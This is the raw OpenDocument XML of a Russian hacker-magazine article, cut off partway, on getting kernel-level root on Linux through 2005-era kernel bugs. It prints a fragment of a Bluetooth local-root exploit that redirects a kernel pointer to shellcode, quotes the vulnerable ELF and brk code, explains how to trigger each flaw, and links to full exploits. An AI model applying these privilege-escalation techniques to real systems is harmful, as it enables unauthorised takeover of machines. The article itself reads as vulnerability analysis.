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WW8Num11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text-properties style:font-name="Courier New" fo:font-size="8pt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11">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="WW8Num11"/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4" style:family="paragraph" style:parent-style-name="Название_20_объекта">
      <style:paragraph-properties fo:text-align="center" style:justify-single-word="false"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Стандартный_20_HTML">
      <style:text-properties fo:font-size="8pt" style:font-size-asian="8pt"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Стандартный_20_HTML">
      <style:text-properties fo:font-size="8pt" fo:language="en" fo:country="US" style:font-size-asian="8pt"/>
    </style:style>
    <style:style style:name="P17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fo:language="en" fo:country="US" style:font-name-complex="Courier New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fo:font-size="8pt" fo:language="en" fo:country="US" style:font-size-asian="8pt" style:font-name-complex="Courier New"/>
    </style:style>
    <style:style style:name="T11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2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3" style:family="text">
      <style:text-properties fo:font-size="8pt" style:font-size-asian="8pt"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties fo:font-size="8pt" fo:language="en" fo:country="US" style:font-size-asian="8pt"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties fo:font-size="8pt" fo:language="en" fo:country="US" fo:font-weight="bold" style:font-size-asian="8pt" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties fo:font-size="8pt" fo:font-weight="bold" style:font-size-asian="8pt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9pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" style:font-size-asian="9pt"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties fo:font-size="9pt" fo:language="en" fo:country="US" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" style:font-size-asian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Рисунок"/>
      </text:sequence-decls>
      <text:h text:style-name="P17" text:outline-level="2">захватываем <text:span text:style-name="T1">ring</text:span> 0 в <text:span text:style-name="T1">Linux</text:span></text:h>
      <text:p text:style-name="Standard">крис касперски ака мыщъх, <text:span text:style-name="T1">no</text:span>-<text:span text:style-name="T1">email</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P10"><text:span text:style-name="T5">нулевое кольцо дает полную власть над процессором, позволяя делать с ним все, что угодно. на этом уровне исполняется код операционной системы, загружаемые модули ядра и кое что еще. считается, что </text:span><text:span text:style-name="T2">LINUX</text:span><text:span text:style-name="T5"> надежно оберегает нулевое кольцо от хакерского вторжения, но это не так. за последние несколько лет обнаружено множество дыр, некоторые из которых остаются не залатанными до сих пор.</text:span></text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">введение</text:h>
      <text:p text:style-name="P12">Что можно сделать с прикладного уровня? Выполнить непривилегированную команду процессора, обратиться к пользовательской ячейке памяти, дернуть системным вызовов. Запись в порты ввода/вывода, перепрограммирование <text:span text:style-name="T1">BIOS</text:span>, маскировка процессов и сетевых соединений возможно только с уровня ядра. Все хакеры стремятся в этот священный Грааль, но не все его находит. Много дорог ведет туда, поэтому мы расскажем только о самых интересных из них.</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">честные способы взлома </text:h>
      <text:p text:style-name="P12">С правами <text:span text:style-name="T1">root</text:span>'а проникнуть в ядро не проблема. Можно, например, написать свой <text:span text:style-name="T1">LKM</text:span> (<text:span text:style-name="T1">Loadable</text:span> <text:span text:style-name="T1">Kernel</text:span> <text:span text:style-name="T1">Module </text:span>– загружаемый модуль ядра) и загрузить его командой <text:span text:style-name="T1">insmod</text:span>. <text:span text:style-name="T1">LKM</text:span>-модули пишутся очень просто (это <text:span text:style-name="T6">вам</text:span> не <text:span text:style-name="T1">Windows</text:span>-драйвера!). Примеры готовых модулей можно найти в <text:span text:style-name="T6">статье "Прятки в </text:span><text:span text:style-name="T3">linux</text:span>", там же рассказывается как их замаскировать от взора бдительного администратора.</text:p>
      <text:p text:style-name="P12">Другой вариант. Ядро монтирует два псевдоустройства — <text:span text:style-name="T7">/</text:span><text:span text:style-name="T8">dev</text:span><text:span text:style-name="T7">/</text:span><text:span text:style-name="T8">mem</text:span> (физическая память до виртуальной трансляции) и <text:span text:style-name="T7">/</text:span><text:span text:style-name="T8">dev</text:span><text:span text:style-name="T7">/</text:span><text:span text:style-name="T8">kmem</text:span> (физическая память после виртуальной трансляции). Из-под <text:span text:style-name="T1">root</text:span>'а мы можем манипулировать с кодом и данными ядра.</text:p>
      <text:p text:style-name="P12">Короче весь вопрос в том, как этого самого <text:span text:style-name="T1">root</text:span>'а заполучить. Легальным образом этого не сделать никак! <text:span text:style-name="T1">LINUX</text:span> поддерживает целый комплекс меры безопасности (только охранников в бронежилетах и машин с мигалками не хватает), однако, в системе защиты имеется множество дыр, делающих ее похожей на дуршлаг. Вот этими дырами мы и воспользуемся!</text:p>
      <text:p text:style-name="Standard"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">дырка<text:span text:style-name="T1"> </text:span>в<text:span text:style-name="T1"> </text:span>голубом<text:span text:style-name="T1"> </text:span>зубе<text:span text:style-name="T1"><text:line-break/></text:span>или<text:span text:style-name="T1"> Linux Kernel Bluetooth Local Root Exploit</text:span></text:h>
      <text:p text:style-name="P12">Крошечный чип Голубого Зуба использует довольно навороченный протокол связи, поддержка которого проходит довольно болезненно. Практически ни одному коллективу разработчиков не удалось предотвратить появление новых дыр, в которые и слон пролезет, но если не слон, но червь — точно. Не стала исключением и <text:span text:style-name="T1">LINUX</text:span>. В апреле 2005 года появилось сообщение о дыре, а следом за этим был написан Kernel Bluetooth Local Root <text:span text:style-name="T1">Exploit</text:span>, работающий на ядрах 2.6.4-52, 2.6.11 и некоторых других.</text:p>
      <text:p text:style-name="P12">Ошибка разработчиков состояла в том, что эти редиски разместили структуры сокета Голубого Зуба в пользовательской области памяти, тем самым открыв полный доступ к модификации всех полей. Одним из таких полей оказался указатель на код, вызываемый с уровня ядра. При нормальном развитии событий он указывает на библиотеку поддержки Голубого Зуба, но нам ничего не стоит перенаправить его на <text:span text:style-name="T1">shell</text:span>-код!</text:p>
      <text:p text:style-name="P12">Ключевой фрагмент эксплоита, дающего права <text:span text:style-name="T1">root</text:span>'а из-под юзера, приведен ниже. Оригинальный исходный текст лежит на <text:span text:style-name="T1">http</text:span>://<text:span text:style-name="T1">home</text:span>.<text:span text:style-name="T1">paf</text:span>.<text:span text:style-name="T1">net</text:span>/<text:span text:style-name="T1">qobaiashi</text:span>/<text:span text:style-name="T1">ong</text:span>_<text:span text:style-name="T1">bak</text:span>.<text:span text:style-name="T1">c</text:span>, а здесь копия: <text:span text:style-name="T1">http</text:span>://<text:span text:style-name="T1">www</text:span>.<text:span text:style-name="T1">securiteam</text:span>.<text:span text:style-name="T1">com</text:span>/<text:span text:style-name="T1">exploits</text:span>/5<text:span text:style-name="T1">KP</text:span>0<text:span text:style-name="T1">F</text:span>0<text:span text:style-name="T1">AFFO</text:span>.<text:span text:style-name="T1">html</text:span> (оригинальный адрес у меня так и не открылся).</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T10">if</text:span><text:span text:style-name="T9"> ((</text:span><text:span text:style-name="T10">tmp</text:span><text:span text:style-name="T9"> = </text:span><text:span text:style-name="T10">klogctl</text:span><text:span text:style-name="T9">(0</text:span><text:span text:style-name="T10">x</text:span><text:span text:style-name="T9">3, </text:span><text:span text:style-name="T10">buf</text:span><text:span text:style-name="T9">, 1700)) &gt; -1)</text:span></text:p>
      <text:p text:style-name="P3">{</text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T10">check</text:span><text:span text:style-name="T9"> = </text:span><text:span text:style-name="T10">strstr</text:span><text:span text:style-name="T9">(</text:span><text:span text:style-name="T10">buf</text:span><text:span text:style-name="T9">, "</text:span><text:span text:style-name="T10">ecx: ");</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T10">printf(" |- [%0.14s]\n", check);</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T10">if (*(check+5) == 0x30 &amp;&amp; *(check+6) == 0x38)</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T10">{</text:span></text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/><text:span text:style-name="T9"><text:tab/><text:tab/></text:span><text:span text:style-name="T10">check+=5;</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/><text:tab/></text:span><text:span text:style-name="T10">printf(" |- suitable value found!using 0x%0.9s\n", check);</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/><text:tab/></text:span><text:span text:style-name="T10">printf(" |- the time has come to push the button... check your id!\n");</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/><text:tab/></text:span><text:span text:style-name="T10">*(check+9) = 0x00;*(--check) = 'x';*(--check) = '0';</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/><text:tab/></text:span><text:span text:style-name="T10">mod = (unsigned int*)strtoul(check, 0, 0);</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/><text:tab/></text:span><text:span text:style-name="T10">for (sock = 0;sock &lt;= 200;sock++)</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T10">*(mod++) = (int)ong_code;//link to shellcode</text:span></text:p>
      <text:p text:style-name="P3"><text:tab/><text:tab/></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/><text:tab/></text:span><text:span text:style-name="T10">if ((sock = socket(AF_BLUETOOTH, SOCK_RAW, arg)) &lt; 0)</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/><text:tab/></text:span><text:span text:style-name="T10">{</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T9"><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T10">printf(" |- something went w0rng (invalid value)\n");</text:span></text:p>
      <text:p text:style-name="P3"><text:tab/><text:tab/><text:tab/>exit(1);</text:p>
      <text:p text:style-name="P3"><text:tab/><text:tab/>}</text:p>
      <text:p text:style-name="P3">}</text:p>
      <text:p text:style-name="P14">Листинг <text:sequence text:ref-name="refЛистинг0" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">1</text:sequence> ключевой фрагмент <text:span text:style-name="T1">Kernel</text:span> <text:span text:style-name="T1">Bluetooth</text:span> <text:span text:style-name="T1">Local</text:span> <text:span text:style-name="T1">Root</text:span> эксплоита, дающий <text:span text:style-name="T1">root</text:span>'а ищ-под юзера</text:p>
      <text:p text:style-name="Standard"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">эльфы падают в дамп</text:h>
      <text:p text:style-name="P12">Самой свежей дырой, которая только была найдена на момент написания этих строк, оказалась уязвимость в <text:span text:style-name="T1">ELF</text:span>-загрузчике, обнаженная 11 мая 2005 года и поражающая целую серию ядер: 2.2.27-rc2, 2.4, 2.4.31-pr1, 2.6, 2.6.12-rc4 и т. д.</text:p>
      <text:p text:style-name="P12">Ошибка сидит в функции elf_core_dump(), расположенной в файле binfmt_elf.c. Ключевой фрагмент уязвимого листинга выглядит так:</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T14">static int elf_core_dump(long signr, struct pt_regs * regs, struct file * file)</text:span></text:p>
      <text:p text:style-name="P16">{</text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">struct elf_prpsinfo psinfo; /* NT_PRPSINFO */</text:span></text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">/* first copy the parameters from user space */</text:span></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">memset(&amp;psinfo, 0, sizeof(psinfo));</text:span></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">{</text:span></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T14"><text:tab/><text:tab/>int i, len;<text:tab/><text:tab/></text:span><text:span text:style-name="T15"> /* 1 */</text:span></text:p>
      <text:p text:style-name="P16"><text:tab/><text:tab/>len = current-&gt;mm-&gt;arg_end - current-&gt;mm-&gt;arg_start;</text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T14"><text:tab/><text:tab/>if (len &gt;= ELF_PRARGSZ)</text:span><text:span text:style-name="T15"> / * 2 * /</text:span></text:p>
      <text:p text:style-name="P16"><text:tab/><text:tab/><text:tab/>len = ELF_PRARGSZ-1;</text:p>
      <text:p text:style-name="P16"><text:tab/><text:tab/>copy_from_user(&amp;psinfo.pr_psargs,/* 1167 */</text:p>
      <text:p text:style-name="P16"><text:tab/><text:tab/> (const char *)current-&gt;mm-&gt;arg_start, len);</text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T14"><text:tab/></text:span><text:span text:style-name="T13">…</text:span></text:p>
      <text:p text:style-name="P15"><text:tab/>}</text:p>
      <text:p text:style-name="P15">…</text:p>
      <text:p text:style-name="P15">}</text:p>
      <text:p text:style-name="P14">Листинг <text:sequence text:ref-name="refЛистинг1" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">2</text:sequence> ключевой фрагмент функции elf_core_dump(), подверженной переполнению</text:p>
      <text:p text:style-name="P12">Типичное переполнение буфера! Программист объявляет знаковую переменную <text:span text:style-name="T1">len</text:span> (см. /* 1 */) и спустя некоторое время передает ее функции <text:span text:style-name="T1">copy</text:span>_<text:span text:style-name="T1">form</text:span>_<text:span text:style-name="T1">user</text:span>, копирующей данные из пользовательской памяти в область ядра. Проверка на отрицательное значение не выполняется (см. /* 2 */). Что это значит для нас в практическом плане? А вот что! Если <text:span text:style-name="T1">current</text:span>-&gt;<text:span text:style-name="T1">mm</text:span>-&gt;<text:span text:style-name="T1">arg</text:span>_<text:span text:style-name="T1">start</text:span> будет больше, чем <text:span text:style-name="T1">current</text:span>-&gt;<text:span text:style-name="T1">mm</text:span>-&gt;<text:span text:style-name="T1">arg</text:span>_<text:span text:style-name="T1">end</text:span>, в ядро скопируется очччень большой регион пользовательского пространства.</text:p>
      <text:p text:style-name="P12">А как этого можно добиться? Анализ показывает, что переменные <text:span text:style-name="T1">current</text:span>-&gt;<text:span text:style-name="T1">mm</text:span>-&gt;<text:span text:style-name="T1">arg</text:span>_<text:span text:style-name="T1">start</text:span> и <text:span text:style-name="T1">current</text:span>-&gt;<text:span text:style-name="T1">mm</text:span>-&gt;<text:span text:style-name="T1">arg</text:span>_<text:span text:style-name="T1">end</text:span> инициализируются в функции create_elf_tables, причем если функция strnlen_user возвратит ошибку, то будет инициализирована лишь переменная current-&gt;mm-&gt;arg_start, а <text:span text:style-name="T1">current</text:span>-&gt;<text:span text:style-name="T1">mm</text:span>-&gt;<text:span text:style-name="T1">arg</text:span>_<text:span text:style-name="T1">end</text:span> сохранит свое значение, унаследованное от предыдущего файла.</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P5">static elf_addr_t *</text:p>
      <text:p text:style-name="P5">create_elf_tables(char *p, int argc, int envc,</text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T10">struct elfhdr * exec,</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T10">unsigned long load_addr,</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T10">unsigned long load_bias,</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9"><text:tab/></text:span><text:span text:style-name="T10">unsigned long interp_load_addr, int ibcs)</text:span></text:p>
      <text:p text:style-name="P5"><text:tab/>{</text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9"><text:tab/><text:tab/></text:span><text:span text:style-name="T10">current-&gt;mm-&gt;arg_start = (unsigned long) p;</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9"><text:tab/><text:tab/></text:span><text:span text:style-name="T10">while (argc--&gt;0)</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9"><text:tab/><text:tab/></text:span><text:span text:style-name="T10">{</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9"><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T10">__put_user((elf_caddr_t)(unsigned long)p,argv++);</text:span></text:p>
      <text:p text:style-name="P7"><text:soft-page-break/><text:span text:style-name="T9"><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T10">len = strnlen_user(p, PAGE_SIZE*MAX_ARG_PAGES);</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9"><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T10">if (!len || len &gt; PAGE_SIZE*MAX_ARG_PAGES)</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T12"><text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T11">return NULL;</text:span><text:span text:style-name="T12"> /* * */</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9"><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T10">p += len;</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9"><text:tab/><text:tab/></text:span><text:span text:style-name="T10">}</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9"><text:tab/><text:tab/></text:span><text:span text:style-name="T10">__put_user(NULL, argv);</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T9"><text:tab/><text:tab/></text:span><text:span text:style-name="T10">current-&gt;mm-&gt;arg_end = current-&gt;mm-&gt;env_start = (unsigned long) p;</text:span></text:p>
      <text:p text:style-name="P6">…</text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T10"><text:tab/></text:span><text:span text:style-name="T9">}</text:span></text:p>
      <text:p text:style-name="P14">Листинг <text:sequence text:ref-name="refЛистинг2" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">3</text:sequence> ключевой фрагмент функции create_elf_tables</text:p>
      <text:p text:style-name="P12">Остается сущая мелочь. Обломать функцию strnlen_user, расположив обе переменных в секции <text:span text:style-name="T1">ELF</text:span> файла с закрытым доступом (PROT_NONE), при обращении к которой произойдет исключение. Для сброса коры программы, ядро вызовет core_dump(). Она в свою очередь вызовет elf_core_dump() и… тут-то и произойдет переполнение! Перезапись области ядра открывает практически неограниченные возможности, ведь <text:span text:style-name="T1">shell</text:span>-код выполняется на нулевом кольце!</text:p>
      <text:p text:style-name="P12">Демонстрационной эксплоит лежит здесь: http://www.isec.pl/vulnerabilities/isec-0023-coredump.txt</text:p>
      <text:p text:style-name="P12"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">проблемы многопоточности</text:h>
      <text:p text:style-name="P12">В классической <text:span text:style-name="T1">UNIX</text:span> никаких потоков вообще не было, а потому не существовало проблемы их синхронизации. С функцией <text:span text:style-name="T1">fork</text:span>() и развитыми средствами межпроцессорного взаимодействия потоки не очень-то и нужны. Но все-таки они появились, продырявив систему до самого дна. Ядро превратилось в настоящее скопище багов. Вот только один из них, обнаруженный в начале января 2005 года и поражающий все ядра версии 2.2, а ядра с версиями от 2.4 до 2.4.29-<text:span text:style-name="T1">pre</text:span>3 и от 2.6 до 2.6.10 включительно.</text:p>
      <text:p text:style-name="P12">Рассмотрим фрагмент функции load_elf_library(), автоматически вызываемой функцией sys_uselib() при загрузке новой библиотеки:</text:p>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T14">static int load_elf_library(struct file *file)</text:span></text:p>
      <text:p text:style-name="P16">{</text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T16"><text:tab/></text:span><text:span text:style-name="T15">down_write(&amp;current-&gt;mm-&gt;mmap_sem);</text:span></text:p>
      <text:p text:style-name="P16"><text:tab/>error = do_mmap(file,</text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/><text:tab/></text:span><text:span text:style-name="T14">ELF_PAGESTART(elf_phdata-&gt;p_vaddr),</text:span></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/><text:tab/></text:span><text:span text:style-name="T14">(elf_phdata-&gt;p_filesz +</text:span></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/><text:tab/></text:span><text:span text:style-name="T14">ELF_PAGEOFFSET(elf_phdata-&gt;p_vaddr)),</text:span></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/><text:tab/></text:span><text:span text:style-name="T14">PROT_READ | PROT_WRITE | PROT_EXEC,</text:span></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/><text:tab/></text:span><text:span text:style-name="T14">MAP_FIXED | MAP_PRIVATE | MAP_DENYWRITE,</text:span></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/><text:tab/></text:span><text:span text:style-name="T14">(elf_phdata-&gt;p_offset -</text:span></text:p>
      <text:p text:style-name="P16"><text:tab/><text:tab/>ELF_PAGEOFFSET(elf_phdata-&gt;p_vaddr)));</text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">up_write(&amp;current-&gt;mm-&gt;mmap_sem);</text:span></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">if (error != ELF_PAGESTART(elf_phdata-&gt;p_vaddr))</text:span></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/><text:tab/></text:span><text:span text:style-name="T14">goto out_free_ph;</text:span></text:p>
      <text:p text:style-name="P15"><text:tab/></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">elf_bss = elf_phdata-&gt;p_vaddr + elf_phdata-&gt;p_filesz;</text:span></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">padzero(elf_bss);</text:span></text:p>
      <text:p text:style-name="P15"><text:tab/></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">len = ELF_PAGESTART(elf_phdata-&gt;p_filesz </text:span></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T14">elf_phdata-&gt;p_vaddr + ELF_MIN_ALIGN - 1);</text:span></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">bss = elf_phdata-&gt;p_memsz + elf_phdata-&gt;p_vaddr;</text:span></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">if (bss &gt; len)</text:span></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/><text:tab/></text:span><text:span text:style-name="T15">do_brk(len, bss - len);</text:span></text:p>
      <text:p text:style-name="P14">Листинг<text:span text:style-name="T1"> </text:span><text:sequence text:ref-name="refЛистинг3" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">4</text:sequence><text:span text:style-name="T1"> </text:span>ключевой фрагмент функции <text:span text:style-name="T1">load</text:span>_<text:span text:style-name="T1">elf</text:span>_<text:span text:style-name="T1">library</text:span>, содержащей ошибку синхронизации потоков</text:p>
      <text:p text:style-name="P12">Как мы видим, семафор <text:span text:style-name="T1">mmap</text:span>_<text:span text:style-name="T1">sem</text:span> освобождается до вызова <text:span text:style-name="T1">do</text:span>_<text:span text:style-name="T1">brk</text:span>() функции, порождая тем самым проблему синхронизации потоков. В тоже время, анализ функции <text:span text:style-name="T1">sys</text:span>_<text:span text:style-name="T1">brk</text:span>(), убеждает нас в том, что функции <text:span text:style-name="T1">do</text:span>_<text:span text:style-name="T1">brk</text:span>() должна вызывается с взведенным семафором. Рассмотрим фрагмент исходного кода, позаимствованный из файла <text:span text:style-name="T1">mm</text:span>/<text:span text:style-name="T1">mmap</text:span>.<text:span text:style-name="T1">c</text:span>:</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T14">[1094]<text:tab/></text:span><text:span text:style-name="T15">vma = kmem_cache_alloc(vm_area_cachep, SLAB_KERNEL);</text:span></text:p>
      <text:p text:style-name="P16"><text:tab/>if (!vma)</text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">return -ENOMEM;</text:span></text:p>
      <text:p text:style-name="P15"><text:tab/></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">vma-&gt;vm_mm = mm;</text:span></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:soft-page-break/><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">vma-&gt;vm_start = addr;</text:span></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">vma-&gt;vm_end = addr + len;</text:span></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">vma-&gt;vm_flags = flags;</text:span></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">vma-&gt;vm_page_prot = protection_map[flags &amp; 0x0f];</text:span></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">vma-&gt;vm_ops = NULL;</text:span></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">vma-&gt;vm_pgoff = 0;</text:span></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">vma-&gt;vm_file = NULL;</text:span></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">vma-&gt;vm_private_data = NULL;</text:span></text:p>
      <text:p text:style-name="P15"><text:tab/></text:p>
      <text:p text:style-name="Стандартный_20_HTML"><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T14">vma_link(mm, vma, prev, rb_link, rb_parent);</text:span></text:p>
      <text:p text:style-name="P14">Листинг <text:sequence text:ref-name="refЛистинг4" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">5</text:sequence> ключевой фрагмент функции <text:span text:style-name="T1">sys</text:span>_<text:span text:style-name="T1">brk</text:span>(), страдающей нарушением конегентности служебных структур данных</text:p>
      <text:p text:style-name="P12">В отсутствии семафора, состояние виртуальной памяти может быть изменено межу вызовов функций kmem_cache_alloc и vma_link, и тогда вновь созданный <text:span text:style-name="T1">VMA</text:span>-дескриптор будет размещен совсем не в том месте, на которое рассчитывали разработчики! Для захвата <text:span text:style-name="T1">root</text:span>'а этого более чем достаточно.</text:p>
      <text:p text:style-name="P12">К сожалению, даже простейший эксплоит занимает слишком много места и поэтому не может быть приведен здесь, однако, его исходный код легко найти в Интернете. Оригинальная версия (с подробным описанием техники взлома) лежит на: http://www.isec.pl/vulnerabilities/isec-0021-uselib.txt.</text:p>
      <text:p text:style-name="Standard"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">получаем <text:span text:style-name="T1">root</text:span>'а на многопроцессорных машинах</text:h>
      <text:p text:style-name="P12">А вот другая интересная уязвимость, затрагивающая большое количество ядер с версиями 2.4/2.6 и поражающая многопроцессорные машины. Обнаруженная в самом начале 2005 года, она все еще остается актуальной, поскольку далеко не все администраторы установили соответствующие заплатки, а многопроцессорные машины (включая микропроцессоры с поддержкой <text:span text:style-name="T1">Hyper</text:span>-<text:span text:style-name="T1">Threading</text:span>) в наши дни скорее правило, чем редкость.</text:p>
      <text:p text:style-name="P12">Во всем виноват обработчик ошибок доступа к страницам (<text:span text:style-name="T1">page</text:span> fault handler), который вызывается всякий раз, когда приложение обращается к невыделенной или защищенной странице памяти. Не все ошибки одинаково фатальны. В частности, <text:span text:style-name="T1">LINUX</text:span> (как и большинство других систем) выделяет стековую память не сразу, а по частям. На вершине выделенной памяти находится станица, доступ к которой умышленно запрещен. Она называется "сторожевой" (<text:span text:style-name="T1">GUARD</text:span>_<text:span text:style-name="T1">PAGE</text:span>). Стек постепенно растет и в какой-то момент "врезается" в сторожевую страницу, возбуждая исключение. Его перехватывает <text:span text:style-name="T1">page</text:span> fault handler и операционная система выделяет стеку некоторое количество памяти, перемещая сторожевую страницу наверх. На однопроцессорных машинах эта схема работает как часы, а вот на многопроцессорных…</text:p>
      <text:p text:style-name="Standard"/>
